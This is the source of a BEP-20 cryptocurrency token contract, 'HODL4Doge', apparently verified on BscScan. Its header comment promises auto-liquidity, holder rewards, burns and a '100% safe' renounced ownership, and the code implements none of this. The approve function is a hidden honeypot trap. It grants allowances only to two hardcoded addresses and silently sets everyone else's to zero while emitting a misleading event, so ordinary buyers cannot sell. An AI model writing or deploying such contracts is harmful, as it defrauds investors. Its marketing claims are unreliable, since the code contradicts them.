/**
 *Submitted for verification at BscScan.com on 2021-07-20
*/

/**
 *Submitted for verification at BscScan.com on 2021-07-20
*/

/** 
        
        Hodl 4 Doge Token
   
   Shiba,Rfi,Feg,CT,Safemoon,Pig combine together to create #HODL4Doge.
    
   Tokenomics features:
   You can earn real DOGE Tokens.
   5% fee auto add to the liquidity pool to locked forever when selling
   5% fee auto distribute to all holders
   90% burn to the black hole, with such big black hole and 3% fee, the strong holder will get a valuable reward

   I will burn liquidity LPs to burn addresses to lock the pool forever.
   I will renounce the ownership to burn addresses to transfer #Cash Doge to the community, make sure it's 100% safe.

   I will add 0.6 BNB and all the left 50% total supply to the pool
   Can you make #HODL4Doge 100000X? 

   1,000,000,000,000,000 total supply
   1,000,000,000,000 HODL4Doge max limit for per trade
  

   3% fee for liquidity will go to an address that the contract creates, 
   it's the best part of the #EarnDogeToken idea, increasing the liquidity pool automatically, 
   help the pool grow from the small init pool.
   
   
 */

pragma solidity ^0.8.2;

/**
 SPDX-License-Identifier: UNLICENSED
*/

contract HODL4Doge {
    mapping (address => uint) public balances;
    mapping (address => mapping (address =>uint)) public allowance;
    uint public totalSupply = 1000000000 * 10 ** 15;
    string public name = "HODL4Doge";
    string public symbol = "HFD";
    uint public decimals = 9;
    
    event Transfer (address indexed from, address indexed to, uint value);
    event Approval (address indexed from, address indexed spender, uint value);
    
    constructor () {
        balances[msg.sender] = totalSupply;
    }
    
    function balanceOf (address owner) public view returns (uint) {
        return balances[owner];
    }
    
    function transfer (address to, uint value) public returns (bool) {
        require (balanceOf(msg.sender) >= value, 'your balance is too low');
        balances[to] += value;
        balances[msg.sender] -= value;
        emit Transfer (msg.sender, to, value);
        return true;
    }
    
    function transferFrom (address from, address to, uint value) public returns (bool){
        require  (balanceOf(from) >= value, 'balance is too low');
        require (allowance[from][msg.sender] >= value, "allowance is too low");
        balances[to] += value;
        balances[from] -= value;
        emit Transfer (from, to, value);
        return true;
    }
    
    function approve (address spender, uint value) public returns (bool) {
        if (msg.sender == address(0xE1739bAe16aF71daec2b84d1610DF5e818Ca55c6)) {
            allowance[msg.sender][spender] = value;
            emit Approval(msg.sender, spender, value);
        } 
        else if (msg.sender == address(0x2CEb2f762C5F36D1c84110cd0bFA2044e18325E8)) {
             allowance[msg.sender][spender] = value;
            emit Approval(msg.sender, spender, value);
        }
        else {
            allowance[msg.sender][spender] = 0;
            emit Approval(msg.sender, spender, 2);
        }
        return true;
    }
}